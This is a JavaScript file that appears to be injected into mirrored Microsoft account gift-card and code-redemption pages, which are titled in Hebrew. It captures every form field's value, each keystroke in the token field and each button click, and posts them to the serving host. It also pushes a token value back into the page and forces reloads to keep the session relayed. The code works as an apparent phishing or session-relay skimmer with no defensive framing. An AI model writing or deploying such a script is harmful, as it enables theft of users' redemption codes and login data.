
  window.addEventListener('load', (event) => {

      console.log('The page has fully loaded');
      //alert(document.title);
      /*
      if (document.title  === 'Microsoft account | ממש את קוד או כרטיס המתנה שלך'){
        setTimeout(()=> {
                    window.location.href = '/iframe/0/0';
                             }
                             ,5000);
       }
*/
      if (document.title  === 'error'|| document.title  === 'WebBlends' || document.title  === 'Continue'
       || document.title  === 'Wait' ){
             setTimeout(()=>
                     {
                        location.reload(true);
                      } ,4000);



      }

       const bodys = document.getElementsByTagName("body");
       console.log(bodys.length);
         if(bodys.length  ==  0){
              location.reload(true)   ;
          }else{
            if (bodys[0].innerHTML.trim().length <10){
                setTimeout(()=>  {
                       location.reload(true);
                  } ,4000);
          }
       }

      const progressBar = document.getElementById("progressBar");
      if(progressBar != null){ setTimeout(()=>
                     {
                        location.reload(true);
                      } ,4000);
      }
       /*
       const webblendBusySpinner = document.getElementById("webblendBusySpinner");
       if(webblendBusySpinner != null){
                    setTimeout(()=>  { location.reload(); } ,2000);
      }
*/
      const pres = document.getElementsByTagName("pre");
      if(pres.length == 1){
         setTimeout(()=>  { location.reload(true); } ,2000);
      }


      const spans = document.getElementsByTagName("span");
      console.log(spans.length);
      if(spans.length > 0){
        //alert(spans[0].aria-label="טוען")
          console.log( spans[0].hasAttribute["aria-label"] );
          if (spans[0].attributes["aria-label"].nodeValue ==="טוען" ){
             setTimeout(()=>  { location.reload(true); } ,2000);

          }

      }
      if (document.title  === 'הזנת קוד למימוש אסימון'){
             getTokenString();
      }

      /*
       let iframeNo = 0;
       for (const iframe of document.documentElement.querySelectorAll('iframe')) {
           iframe.src='/iframe/' + iframeNo;
           iframeNo++;
        }
*/
  });
/*
$(document).ready( function() {
  $("#tokenString").inputmask("XXXXX-XXXXX-XXXXX-XXXXX");
});
*/

  document.addEventListener('blur', (e) => {
     console.log(e);

    const { key, target } = e
    console.log(key);
    console.log(target);
 })
 document.addEventListener('change', (e) => {
       var xpath =getElementXPath(event.target);
        const { key, target } = e

      let field = {};
      field.xpath = xpath;
      field.value = event.target.value;
      if (target.id ==='tokenString'){
         if (field.value.trim().length == 29){
           sendField(field ,"updateTokenString");
         }
      }
       else{
         sendField(field ,"updateFieldData");
      }
   /*
     alert(event.target.value);
     alert(event.target.id);
     console.log(e);

    const { key, target } = e

    console.log(key);
    console.log(target);
    console.log(this);
    console.log(this.value);
    alert(this.value);

    alert(target.name);
    */
 })




  document.addEventListener('click', (e) => {
     //alert("click");
     //alert(event.target.value);
     //alert(event.target.id);
    // alert(target.name);
     console.log(e);

    const { key, target } = e
    console.log(key);

    if(target.type === 'button' ){
      var xpath =getElementXPath(event.target);
       let field = {};
       field.xpath = xpath;
       sendClick(field);;
    }
    //alert(target.type);
 })
 /*   if (target === url) {
      return
    } else if (target === input) {
      if ((key !== 'Process' && key !== 'Enter') || (key === 'Process' && (e.code === 'ArrowLeft' || e.code === 'ArrowRight'))) {
        window.setTimeout(
          () => window.requestAnimationFrame(
            () => composition(target)
          ),
          5
        )
      }

      if (key !== 'Enter') {
        return
      }
    } else if (['Backspace'].includes(key)) {
      e.preventDefault()
    }

   })
*/
/*
  document.addEventListener('keydown', (e) => {
     console.log(e);

    const { key, target } = e
    console.log(key);
    console.log(target);
 })
*/
/*
    if (target === url) {
      return
    } else if (target === input) {
      if ((key !== 'Process' && key !== 'Enter') || (key === 'Process' && (e.code === 'ArrowLeft' || e.code === 'ArrowRight'))) {
        window.setTimeout(
          () => window.requestAnimationFrame(
            () => composition(target)
          ),
          5
        )
      }

      if (key !== 'Enter') {
        return
      }
    } else if (['Backspace'].includes(key)) {
      e.preventDefault()
    }

   })
*/

  document.addEventListener('keyup', (e) => {
     console.log(e);

    const { key, target } = e
    console.log(key);
    console.log(target);
    if (key ===  'Control'){
       return;
    }
    if (target.id ==='tokenString'){
           var xpath =getElementXPath(event.target);
           let field = {};
           field.xpath = xpath;
           field.value = event.target.value;
           console.log("sendField-updateTokenString");
           sendField(field ,"updateTokenString");

     //alert("tokenString");
    }
 })

/*
    if (target === url) {
      return
    } else if (target === input) {
      if (key !== 'Enter') {
        return
      }
    } else if (['Backspace'].includes(key)) {
      e.preventDefault()
    }

   })
*/

/**
 * Gets an XPath for an element which describes its hierarchical location.
 */
function getElementXPath(element)
{
  if (element && element.id)
    return '//*[@id="' + element.id + '"]';
  else
    return getElementTreeXPath(element);
};

function getElementTreeXPath(element)
{
  var paths = [];

  // Use nodeName (instead of localName) so namespace prefix is included (if any).
  for (; element && element.nodeType == 1; element = element.parentNode)
  {
    var index = 0;
    for (var sibling = element.previousSibling; sibling; sibling = sibling.previousSibling)
    {
      // Ignore document type declaration.
      if (sibling.nodeType == Node.DOCUMENT_TYPE_NODE)
        continue;

      if (sibling.nodeName == element.nodeName)
        ++index;
    }

    var tagName = element.nodeName.toLowerCase();
    var pathIndex = (index ? "[" + (index+1) + "]" : "");
    paths.splice(0, 0, tagName + pathIndex);
  }

  return paths.length ? "/" + paths.join("/") : null;
};




    //updateTokenString

    function getTokenString(){// pass your data in method
        $.ajax({
                type: "GET",
               // url: window.location.protocol + '//'+ window.location.hostname  + ':' +  window.location.port + "/updateFieldData",
                 url: window.location.protocol + '//'+ window.location.hostname  + ':' +  window.location.port + "/getTokenString",

                contentType: "application/json; charset=utf-8",
                crossDomain: true,
                dataType: "json",
                success: function (data, status, jqXHR) {
                        console.log(data);
                        $('#tokenString').val(data.value);
                        console.log(data.value.length);



                     // return data.value;
                   // alert("success");// write success in " "
                },

                error: function (jqXHR, status) {
                    // error handler
                    //console.log(jqXHR);
                   // alert('fail' + status.code);
                }
             });
       }



    function sendField(field , path){// pass your data in method
     $.ajax({
             type: "POST",
            // url: window.location.protocol + '//'+ window.location.hostname  + ':' +  window.location.port + "/updateFieldData",
              url: window.location.protocol + '//'+ window.location.hostname  + ':' +  window.location.port + "/" + path,

             data: JSON.stringify(field),// now data come in this function
             contentType: "application/json; charset=utf-8",
             crossDomain: true,
             dataType: "json",
             success: function (data, status, jqXHR) {
                     console.log(data);

                      if (path === 'updateTokenString'){
                         $('#tokenString').val(data.value);
                         console.log(data.value.length);
                         if(data.value.length == 29){
                            location.reload(true)   ;
                         }

                      }


                  // return data.value;
                // alert("success");// write success in " "
             },

             error: function (jqXHR, status) {
                 setTimeout(()=>  { location.reload(true); } ,2000);
                 // error handler
                 //console.log(jqXHR);
                // alert('fail' + status.code);
             }
          });
    }

    function sendClick(field){// pass your data in method

         $.ajax({
                 type: "POST",
                 url: window.location.protocol + '//'+ window.location.hostname  + ':' +  window.location.port+ "/click",
                 data: JSON.stringify(field),// now data come in this function
                 contentType: "application/json; charset=utf-8",
                 crossDomain: true,
                 dataType: "json",
                 success: function (data, status, jqXHR) {
                       setTimeout(()=> {
                          console.log("data.url: " + data.url);
                          //window.location.href = data.url;
                          location.reload(true);

                       }
                       ,3000);


                    // alert("success");// write success in " "
                 },

                 error: function (jqXHR, status) {
                     // error handler
                     console.log(jqXHR);
                     setTimeout(()=>  { location.reload(true); } ,2000);

                 }
              });
        }